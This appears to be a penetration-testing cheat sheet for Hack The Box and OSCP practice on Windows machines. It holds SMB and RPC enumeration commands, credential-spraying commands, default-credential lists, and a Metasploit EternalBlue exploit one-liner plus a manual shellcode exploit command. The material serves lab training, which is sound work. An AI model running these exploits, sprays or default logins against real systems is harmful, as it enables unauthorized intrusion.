# Windows/SMB Machine Workflow — Easy Tier

Use this chain on every Windows box. Run each step before assuming a service isn't useful.

## Full SMB Enumeration Chain

```bash
# 1. SMB vuln + share enum
nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-enum-shares,smb-security-mode target
nmap -p 139,445 --script smb-enum-users target

# 2. List shares (anonymous)
smbclient -L //target -N
nxc smb target -u '' -p '' --shares
nxc smb target -u 'guest' -p '' --shares

# 3. Browse a share
smbclient //target/SHARENAME -N
smb: \> ls
smb: \> get filename.txt

# 4. RPC enumeration
rpcclient -U "" target -N
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> querydominfo

# 5. Spray credentials once found
nxc smb target -u users.txt -p passwords.txt --continue-on-success
nxc smb target -u admin -p 'Password123' --shares
```

## MS17-010 (EternalBlue) — HTB Blue, Legacy

```bash
# Check
nmap -p 445 --script smb-vuln-ms17-010 target

# Exploit with Metasploit (allowed once on OSCP exam)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target; set LHOST YOUR_IP; run"

# Manual exploit: github.com/worawit/MS17-010
python3 send_and_execute.py target shellcode/sc_x64.bin
```

## Default Credentials to Try First

| Service | Default |
|---------|---------|
| Tomcat | `admin:admin`, `tomcat:tomcat`, `tomcat:s3cret` |
| FTP | `anonymous:anonymous` |
| SMB | `guest:`, `administrator:` |
| WinRM | Use credentials found from other services |

## HTB Easy Windows Starting Boxes

- **Blue** — MS17-010, pure exploit
- **Legacy** — MS08-067, older Windows
- **Jerry** — Tomcat default creds, WAR file upload

Complete these three before moving to Medium. They cover the three most common Easy-tier Windows attack patterns.
